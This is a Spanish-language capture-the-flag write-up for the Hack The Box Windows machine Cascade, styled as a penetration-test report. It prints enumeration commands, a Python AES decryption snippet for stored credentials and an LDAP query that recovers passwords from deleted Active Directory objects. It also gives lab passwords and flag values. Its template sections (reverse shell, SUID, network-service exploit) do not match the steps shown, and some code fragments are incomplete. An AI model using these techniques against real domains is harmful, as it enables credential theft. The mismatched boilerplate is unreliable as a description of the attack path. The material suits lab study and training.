---
title: "Informe Técnico: Cascade (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Cascade de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Cascade

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Cascade** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Cascade |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Windows |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**What is Ryan Thompson's username on Cascade?**

R:r.thompson

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_01.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_02.png)

```jsx
rpcclient -U "" -N 10.10.10.182 -c enumdomusers \
| awk -F'\\] ' '{print $2}' | awk '{print $1}' > users.txt
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_03.png)

```jsx
rpcclient -U "" -N 10.10.10.182 -c enumdomusers \
| awk -F'[][]' '/user:/{print $2}' > users.txt
```

**What is r.thompson's password?**

R: rY4n5eva

![Captura de pantalla 2025-08-27 213207.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_04.png)

**What non-default share does r.thompson have access to?**

R: Data

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_05.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_06.png)

**What is the name of the temporary account that supposedly will be deleted at the end of 2018?**

R:tempadmin

![Captura de pantalla 2025-08-28 002025.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_07.png)

**What is the s.smith user's password?**

R:

```jsx
iconv -f UTF-16LE -t UTF-8 'VNC Install.reg' | less 
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_08.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_09.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_10.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_11.png)

**Submit the flag located on the s.smith user's desktop.**

R: f878539a7f10329e5d648560db7768b9

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_12.png)

**What script is run whenever s.smith logs into Cascade?**

R: MapAuditDrive.vbs

```jsx
net user s.smith /domain
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_13.png)

What is the name of the sqlite database available in the share that s.smith can access?

R: audit.db

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_14.png)

**What is the name of the .NET executable that contains encrypted credentials for a user on the host?**

R: CascAudit.exe

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_15.png)

**What is the password for arksvc?**

R: w3lc0meFr31nd

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_16.png)

BQO5l5Kj9MdErXx6Q6AGOw==  w3lc0meFr31nd

```jsx
grep -Rni "DecryptString" decomp 
grep -RniE "AesKey|DefaultSettingValue|Settings" decomp
sqlite3 -header -column Audit.db "SELECT uname,pwd,domain FROM Ldap;"

python3 - <<'PY'
import sqlite3, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
```

```jsx
DB='Audit.db'
KEY=b'BQO5l5Kj9MdErXx6Q6AGOw=='          # <-- RELLENA con la que encontraste
IV =b'1tdyjCbY1Ix49842'          # del DLL
```

```jsx
con=sqlite3.connect(DB); cur=con.cursor()
for u,p,d in cur.execute("SELECT uname,pwd,domain FROM Ldap"):                                   <....
❯ python3 - <<'PY'
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
key=b"c4scadek3y654321"
iv =b"1tdyjCbY1Ix49842"
ct =base64.b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")
print(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct),16).decode())
PY
```

What well-known Windows group is arksvc a member of?

R: AD Recycle Bin

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_17.png)

What is the password for the administrator account?

R: baCT3r1aN00dles

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_18.png)

```jsx
ldapsearch -x -H ldap://10.10.10.182 \
-D 'arksvc@cascade.local' -w 'w3lc0meFr31nd' \
-b "CN=Deleted Objects,DC=cascade,DC=local" \
-E "1.2.840.113556.1.4.417" \
'(cascadeLegacyPwd=*)' sAMAccountName cascadeLegacyPwd -o ldif-wrap=no
```

![Captura de pantalla 2025-08-28 013947.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_19.png)

**Submit the flag located on the administrator user's desktop.**

R: 0a7f2d6732b18b8e84cc4bb91695143c

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cascade/images/step_20.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
